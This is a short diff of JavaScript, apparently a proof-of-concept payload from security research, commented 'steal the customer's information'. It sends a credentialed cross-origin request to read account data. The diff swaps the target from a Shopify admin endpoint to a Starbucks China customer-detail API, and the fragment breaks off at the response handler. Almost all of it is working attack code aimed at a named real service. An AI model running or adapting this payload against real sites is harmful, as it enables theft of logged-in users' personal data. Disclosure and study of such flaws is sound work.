@@ -1,6 +1,6 @@
 //steal the customer's information
 var steal = new XMLHttpRequest();
-steal.open('get', 'https://johnstone-attacker.myshopify.com/admin/shop.json');
+steal.open('get', 'https://profile.starbucks.com.cn/api/Customers/detail');
 steal.withCredentials = true;
 steal.send();
 steal.onreadystatechange = function () {
